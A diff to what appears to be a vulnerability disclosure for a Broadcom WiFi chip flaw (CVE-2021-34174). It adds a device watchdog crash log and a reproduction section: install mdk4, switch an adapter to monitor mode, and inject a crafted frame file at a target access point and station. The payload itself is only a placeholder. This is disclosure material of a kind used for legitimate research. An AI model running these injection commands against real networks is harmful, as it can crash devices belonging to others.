@@ -56,7 +56,7 @@ E (1480783) task_wdt: Tasks currently running:
 E (1480783) task_wdt: CPU 0: wifi
 E (1480783) task_wdt: CPU 1: IDLE1
 E (1480783) task_wdt: Print CPU 0 (current core) backtrace
-
+CVE-2021-34174
 
 Backtrace:0x400D3730:0x3FFB0760 0x400828D9:0x3FFB0780 0x4010C9A2:0x3FFC05E0 0x400FE4AF:0x3FFC0600 0x4010DC03:0x3FFC0660 0x4010C5E0:0x3FFC0680 0x401 
 
@@ -261,8 +261,9 @@ This vulnerability is discovered in broadcom's BCM4352 and BCM43684 chips. Any w
 ```
 
 # Reproduce & PoC
-
+```
 (1) Linux (ubuntu/kali) OS
+
     apt-get install pkg-config libnl-3-dev libnl-genl-3-dev libpcap-dev 
     git clone https://github.com/aircrack-ng/mdk4
     cd mdk4
@@ -273,14 +274,16 @@ This vulnerability is discovered in broadcom's BCM4352 and BCM43684 chips. Any w
     #Write payload into ./pocs/poc_test
     echo "payload hex str" > ./pocs/poc_test
 
+
 (2) Reproducing this issue
     a. Connecting device to AP
     b. To see what channel the AP is working on
     c. To see the MAC address of the AP and the device
-
     d. Plugging a WiFi USB adapter(support monitor mode and packet injection, 2.4G/5G) into the PC(linux) and to see the usb wifi interface name.
+
         sudo ifconfig iface_name down
         sudo iwconfig iface_name mode monitor
         sudo ifconfig iface_name up
 
     e. Reproduce using mdk4: sudo mdk4 [iface_name] x -c [channel_numer] -v poc_test -s 1 -B [ap-mac] -S [ap-mac] -T [sta-mac]
+```
